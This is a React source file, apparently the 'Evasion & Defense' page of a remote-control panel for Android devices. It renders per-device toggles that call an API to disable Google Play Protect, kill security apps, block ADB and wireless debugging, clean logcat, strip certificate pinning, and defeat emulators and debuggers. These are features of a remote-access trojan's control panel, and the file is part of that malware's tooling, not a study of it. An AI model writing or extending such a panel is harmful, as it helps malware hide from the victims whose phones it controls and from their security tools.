import { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import PageHeader from '../components/PageHeader'
import { evasion } from '../utils/api'
import { Bug, Shield, Eye, Terminal, Lock, Smartphone } from 'lucide-react'

const features = [
  { id: 'play_protect', label: 'Google Play Protect Disabler', icon: Shield },
  { id: 'anti_emulator', label: 'Anti-Emulator Detection', icon: Eye },
  { id: 'anti_debugger', label: 'Anti-Debugger Hook', icon: Terminal },
  { id: 'root_bypass', label: 'Root Detection Bypass', icon: Lock },
  { id: 'dex_obfuscator', label: 'Dex Class Obfuscator', icon: Smartphone },
  { id: 'strings_encrypt', label: 'Native Strings Encryptor', icon: Lock },
  { id: 'api_hasher', label: 'API Function Name Hasher', icon: Terminal },
  { id: 'security_kill', label: 'Security App Kill Switch', icon: Shield },
  { id: 'adb_block', label: 'ADB Blocker', icon: Terminal },
  { id: 'wireless_debug', label: 'Wireless Debug Disabler', icon: Smartphone },
  { id: 'logcat_clean', label: 'Logcat Cleaner', icon: Eye },
  { id: 'cert_strip', label: 'Certificate Pinning Stripper', icon: Lock },
]

export default function EvasionPage() {
  const { deviceId } = useParams()
  const [status, setStatus] = useState({})

  useEffect(() => { if (deviceId) loadStatus() }, [deviceId])

  const loadStatus = async () => {
    const data = await evasion.status(deviceId)
    if (data) setStatus(data)
  }

  const toggleFeature = async (feature) => {
    await evasion.toggle(deviceId, feature, !status[feature])
    loadStatus()
  }

  return (
    <div className="animate-fade-in">
      <PageHeader title="Evasion & Defense" icon={Bug} onDeviceChange={() => {}} />

      <div className="wuzen-panel p-6">
        <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-4">Anti-Analysis Features</h3>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {features.map(f => {
            const Icon = f.icon
            const enabled = status[f.id]
            return (
              <div key={f.id} className="flex items-center justify-between p-4 rounded-lg bg-wuzen-card border border-wuzen-border">
                <div className="flex items-center gap-3">
                  <Icon className="w-4 h-4 text-wuzen-muted" />
                  <span className="text-sm">{f.label}</span>
                </div>
                <button
                  onClick={() => toggleFeature(f.id)}
                  className={`w-12 h-6 rounded-full relative transition-colors ${enabled ? 'bg-wuzen-success' : 'bg-wuzen-border'}`}
                >
                  <div className={`absolute top-0.5 w-5 h-5 rounded-full bg-white transition-transform ${enabled ? 'translate-x-6' : 'translate-x-0.5'}`} />
                </button>
              </div>
            )
          })}
        </div>
      </div>
    </div>
  )
}
